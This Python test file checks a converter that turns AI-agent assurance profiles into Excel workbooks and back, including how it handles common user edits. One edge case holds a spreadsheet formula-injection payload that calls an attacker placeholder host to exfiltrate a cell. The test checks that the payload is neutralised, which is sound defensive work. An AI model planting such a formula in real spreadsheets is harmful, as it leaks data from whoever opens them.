#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
"""Workbook converter tests.

1. Round trip: every example and valid vector, and a set of edge cases, goes Profile -> workbook -> Profile
   and must come back equal (stage and signatures aside: a workbook only carries drafts) and get the same
   verdict from the checker. Normalisations, as documented in arp_xlsx.py: for optional fields, absent,
   null and [] are alike; controls and action classes come back in catalogue order; 3.0 equals 3.
2. Edits: a filled workbook is changed the way people change workbooks (deleted example row, typos in
   drop-down values, formulas, Excel dates, '18%', renamed sheet …); each must be read correctly or reported
   with its sheet and row, never crash.

  python3 templates/test_roundtrip.py
"""
import copy, datetime as dt, json, sys, tempfile
from pathlib import Path
from openpyxl import load_workbook
from arp_xlsx import from_profile, to_profile, read_workbook, WorkbookError, KIT, SHEET_NAMES, FIRST_DATA_ROW, derive_disclosures
from arp_conform import check

def _clean(x):
    if isinstance(x, dict): return {k: _clean(v) for k, v in x.items() if v is not None and v != []}
    if isinstance(x, list): return [_clean(v) for v in x]
    if isinstance(x, float) and x.is_integer(): return int(x)
    return x

def norm(p):
    p = json.loads(json.dumps(p)); p["stage"] = "draft"; p["signatures"] = []
    p["claim"]["controls"].sort(key=lambda c: c["control_id"])
    for k in ("permitted", "prohibited"): p["claim"]["actions"][k].sort(key=lambda a: int(a[1:]))
    return _clean(p)

def diff(a, b, path=""):
    if type(a) != type(b): return [f"{path}: {a!r} != {b!r}"]
    if isinstance(a, dict):
        out = []
        for k in sorted(set(a) | set(b)):
            if k not in a or k not in b: out.append(f"{path}/{k}: only in {'original' if k in a else 'round-trip'}")
            else: out += diff(a[k], b[k], f"{path}/{k}")
        return out
    if isinstance(a, list):
        if len(a) != len(b): return [f"{path}: length {len(a)} != {len(b)}"]
        return sum((diff(x, y, f"{path}[{i}]") for i, (x, y) in enumerate(zip(a, b))), [])
    return [] if a == b else [f"{path}: {a!r} != {b!r}"]

def verdict(p):
    q = json.loads(json.dumps(p)); q["stage"] = "draft"; q["signatures"] = []
    return sorted({i["rule"] for i in check(q).errors})

def roundtrip(p, tmp):
    x = Path(tmp) / "t.xlsx"; from_profile(p).save(x); return to_profile(x)

def load(name):
    f = KIT / "conformance" / "vectors" / "valid" / name
    return json.loads(f.read_text(encoding="utf-8"))

def edge_cases():
    """Values that a naive converter loses or changes (review B-09)."""
    base = load("v03-l2-issued.json"); out = []
    def case(name, fn):
        p = copy.deepcopy(base); fn(p); out.append((name, p))
    case("approval quality with only an assessment", lambda p: p["claim"]["autonomy"].__setitem__("approval_quality", {"assessment": "not_assessed"}))
    case("issuer without a role", lambda p: p["issuance"].__setitem__("issuer", {"name": "A. Assessor", "organisation": "Example Bank plc (fictional)", "independent": False}))
    case("vendor product containing a comma", lambda p: p["subject"].__setitem__("vendor_products", ["Acme, Inc. (fictional)", "Other"]))
    case("limitation containing a line break", lambda p: p["status"].__setitem__("limitations", ["first line\nsecond line", "plain"]))
    case("configurations that look like other types", lambda p: [c.__setitem__("configuration", v) for c, v in zip(p["claim"]["controls"], ["123", "true", {"cap": 1000}, "{not json", "json:literal"])])
    case("free text with leading and trailing spaces", lambda p: p["claim"].__setitem__("statement", "  " + p["claim"]["statement"] + "  "))
    case("text that starts with = (formula injection)", lambda p: p["subject"].__setitem__("description", '=WEBSERVICE("https://attacker.example/?d="&B4)'))
    case("integral float", lambda p: p["claim"]["autonomy"].setdefault("approval_quality", {"assessment": "substantive"}).__setitem__("median_seconds_to_approve", 212.0))
    def bench(p):
        p["assurance"]["comparability"].update({"flag": True, "environment_version": "ref-env 0.1", "hidden_set_version": "hs-2026-09", "fidelity_statement": "Reference conditions only."})
        p["benchmark"] = {"assessor": {"organisation": "Reference Assessor Ltd (fictional)", "accreditation_ref": "ACC-0001 (fictional)", "independent": True},
                          "results": [{"metric": "boundary detection", "value": 0.92, "grade": "B"}, {"metric": "prohibited attempts", "value": 0}]}
        p["assurance"]["disclosures"] = derive_disclosures(p["assurance"]["axes"], True)
    case("benchmark object with the flag set", bench)
    case("non-ASCII text", lambda p: p["subject"].__setitem__("description", "Agent für Zahlungsabwicklung — naïve café 🙂"))
    # rc2 fields
    def judge(p):
        for x in p["results"][:2]: x["evaluation"]["judge_model"] = {"provider": "ExampleAI", "model": "judge-1", "version": "2026-01-01"}
        if len(p["results"]) > 2: p["results"][2]["evaluation"]["judge_model"] = {"provider": "Example / Labs", "model": "j", "version": "1"}
    case("model judge objects, one with ' / ' in a part", judge)
    def inv(p):
        p["invalidation"]["voids"].append({"trigger": "x_branch_merger", "ref": "subject.institution", "description": "A merger changes the legal entity."})
        p["invalidation"]["cosmetic"] = [{"trigger": "x_typo", "description": "Spelling fixes in the statement."}]
        p["invalidation"]["monitoring"] = "Weekly review of the change log (fictional)."
    case("invalidation items with extension triggers, refs and monitoring", inv)
    def misc(p):
        p["status"]["exceptions"] = ["Policy 4.2 waived for the pilot (fictional)"]
        p["status"]["open_findings"].append({"id": "of-x", "kind": "other", "note": "Example finding.", "response": "remediation"})
        p["floors"][0]["axis"] = "autonomy"
        p["claim"]["odd"]["operational_scope"] = "Business hours, up to 500 consents a day (fictional)"
        if (p["assurance"].get("coverage") or {}).get("odd"): p["assurance"]["coverage"]["odd"]["claim_fields"] += 1   # a new claim field
        aq = p["claim"]["autonomy"].setdefault("approval_quality", {"assessment": "substantive"})
        aq.update({"consequence_displayed": False, "sampled_review_quality": 0.9})
        if p["assurance"].get("fidelity"): p["assurance"]["fidelity"]["known_differences"].append("Second line\nwith a break")
    case("exceptions, finding response, floor axis, operational scope, new approval-quality fields", misc)
    return out

def edit_cases(tmp):
    """(name, edit function, check function) on a workbook made from the Level 1 example."""
    src = json.loads((KIT / "examples" / "l1-aml-alert-triage.draft.json").read_text(encoding="utf-8"))
    def sheet(wb, key): return wb[SHEET_NAMES[key]]
    def kv_row(ws, key): return next(r for r in range(1, ws.max_row + 1) if ws.cell(r, 4).value == key)
    def row_of(ws, val): return next(r for r in range(1, ws.max_row + 1) if ws.cell(r, 1).value == val)
    cases = []
    def add(name, edit, expect): cases.append((name, edit, expect))
    def has(rd, text, kind="errors"): return any(text in m for m in getattr(rd, kind))
    def e_delete_example(wb):
        ws = sheet(wb, "Models"); ws.delete_rows(4)
    add("example row deleted on Models keeps the first model", e_delete_example,
        lambda p, rd: not rd.errors and len(p["subject"]["models"]) == len(src["subject"]["models"]))
    add("action status typed 'prohibitted'", lambda wb: sheet(wb, "Actions").cell(row_of(sheet(wb, "Actions"), "A5"), 4, "prohibitted"),
        lambda p, rd: has(rd, "sheet '4 Actions' row") and has(rd, "'prohibitted' is not an allowed value"))
    add("control status typed 'yes'", lambda wb: sheet(wb, "Controls").cell(row_of(sheet(wb, "Controls"), "harness.kill_switch"), 4, "yes"),
        lambda p, rd: has(rd, "sheet '5 Controls' row") and has(rd, "'yes' is not an allowed value"))
    add("formula in Evidence as of", lambda wb: sheet(wb, "Identity").cell(kv_row(sheet(wb, "Identity"), "issuance.evidence_as_of"), 2, "=DATE(2026,9,1)"),
        lambda p, rd: has(rd, "Evidence as of") and has(rd, "contains a formula"))
    add("formula in Use case", lambda wb: sheet(wb, "Claim").cell(kv_row(sheet(wb, "Claim"), "claim.odd.use_case"), 2, '="Alert "&"triage"'),
        lambda p, rd: has(rd, "contains a formula"))
    add("Valid from entered as an Excel date", lambda wb: sheet(wb, "Identity").cell(kv_row(sheet(wb, "Identity"), "issuance.valid_from"), 2, dt.datetime(2026, 9, 22)),
        lambda p, rd: not rd.errors and p["issuance"]["valid_from"] == "2026-09-22")
    add("Issued at entered as an Excel date-time", lambda wb: sheet(wb, "Identity").cell(kv_row(sheet(wb, "Identity"), "issuance.issued_at"), 2, dt.datetime(2026, 9, 22, 0, 0)),
        lambda p, rd: not rd.errors and p["issuance"]["issued_at"] == "2026-09-22T00:00:00Z" and has(rd, "read as UTC", "warnings"))
    add("date typed 2026-9-1", lambda wb: sheet(wb, "Identity").cell(kv_row(sheet(wb, "Identity"), "issuance.valid_until"), 2, "2026-9-1"),
        lambda p, rd: has(rd, "Valid until") and has(rd, "is not a date"))
    def e_numbers(wb):
        ws = sheet(wb, "Claim")
        ws.cell(kv_row(ws, "claim.autonomy.approval_quality.edit_rate"), 2, "18%")
        ws.cell(kv_row(ws, "claim.autonomy.approval_quality.sample_size"), 2, "40 records")
        wa = sheet(wb, "Assurance"); wa.cell(kv_row(wa, "assurance.axes.odd"), 2, "Level 1")
    add("'18%', '40 records' and 'Level 1'", e_numbers,
        lambda p, rd: p["claim"]["autonomy"]["approval_quality"].get("edit_rate") == 0.18 and p["assurance"]["axes"]["odd"] == 1
        and has(rd, "'40 records' is not a number") and len(rd.errors) == 1)
    add("sheet renamed", lambda wb: setattr(sheet(wb, "Floors"), "title", "My floors"),
        lambda p, rd: not rd.errors and has(rd, "expected the name '10 Floors'", "warnings"))
    def e_conflicting_prov(wb):
        ws = sheet(wb, "Provenance"); r = FIRST_DATA_ROW
        while ws.cell(r, 1).value: r += 1
        ws.cell(r, 1, "autonomy.tier"); ws.cell(r, 2, "measured"); ws.cell(r, 3, "e1")
    add("second provenance row with a different class", e_conflicting_prov,
        lambda p, rd: has(rd, "disagrees with row") and has(rd, "autonomy.tier"))
    add("example-row text pasted in the middle of a table is ignored", lambda wb: sheet(wb, "Floors").cell(FIRST_DATA_ROW + 5, 1, "e.g. something"),
        lambda p, rd: not rd.errors and len(p["floors"]) == len(src["floors"]))
    def e_outside(wb):
        import arp_xlsx as X
        ws = sheet(wb, "Floors"); ws.cell(FIRST_DATA_ROW + 1, len(X.TABLES["Floors"]) + 2, "also covers A7 contacts")
    add("text typed outside a table's columns is reported, with its cell", e_outside,
        lambda p, rd: not rd.errors and has(rd, "text outside the table's columns was not read", "warnings") and has(rd, "sheet '10 Floors' row", "warnings"))
    def e_deleted_sheet(wb): del wb[SHEET_NAMES["Gaps"]]
    cases.append(("sheet deleted", e_deleted_sheet, "raises"))
    return src, cases

def main():
    fails = 0
    files = sorted((KIT / "examples").glob("*.json")) + sorted((KIT / "conformance" / "vectors" / "valid").glob("*.json"))
    items = [(f.name, json.loads(f.read_text(encoding="utf-8"))) for f in files] + edge_cases()
    with tempfile.TemporaryDirectory() as tmp:
        print("Round trip")
        for name, p in items:
            try:
                q = roundtrip(p, tmp); d = diff(norm(p), norm(q))
                v1, v2 = verdict(p), verdict(q)
                if v1 != v2: d.append(f"checker verdict changed: {v1} -> {v2}")
            except WorkbookError as e: d = [f"{e}: " + "; ".join(e.problems[:5])]
            except Exception as e: d = [f"crashed: {type(e).__name__}: {e}"]
            fails += bool(d)
            print(("  PASS " if not d else "  FAIL ") + name + ("" if not d else "\n     " + "\n     ".join(d[:12])))
        x = Path(tmp) / "inj.xlsx"; p = dict(edge_cases())['text that starts with = (formula injection)']; from_profile(p).save(x)
        ws = load_workbook(x)[SHEET_NAMES["Identity"]]
        cell = next(ws.cell(r, 2) for r in range(1, ws.max_row + 1) if ws.cell(r, 4).value == "subject.description")
        ok = cell.data_type == "s"; fails += not ok
        print(("  PASS " if ok else "  FAIL ") + "text starting with '=' is stored as text, not a live formula")
        print("Edits to a filled workbook")
        src, cases = edit_cases(tmp)
        for name, edit, expect in cases:
            x = Path(tmp) / "e.xlsx"; from_profile(src).save(x); wb = load_workbook(x); edit(wb); wb.save(x)
            try:
                if expect == "raises":
                    try: read_workbook(x); ok, info = False, "no error raised"
                    except WorkbookError as e: ok, info = "is missing" in str(e), str(e)
                else:
                    p, rd = read_workbook(x); ok = bool(expect(p, rd)); info = "; ".join(rd.errors + rd.warnings)[:400]
            except Exception as e: ok, info = False, f"crashed: {type(e).__name__}: {e}"
            fails += not ok
            print(("  PASS " if ok else "  FAIL ") + name + ("" if ok else f"\n     {info}"))
    total = len(items) + 1 + len(cases)
    print(f"\n{total - fails}/{total} passed")
    sys.exit(1 if fails else 0)

if __name__ == "__main__":
    main()
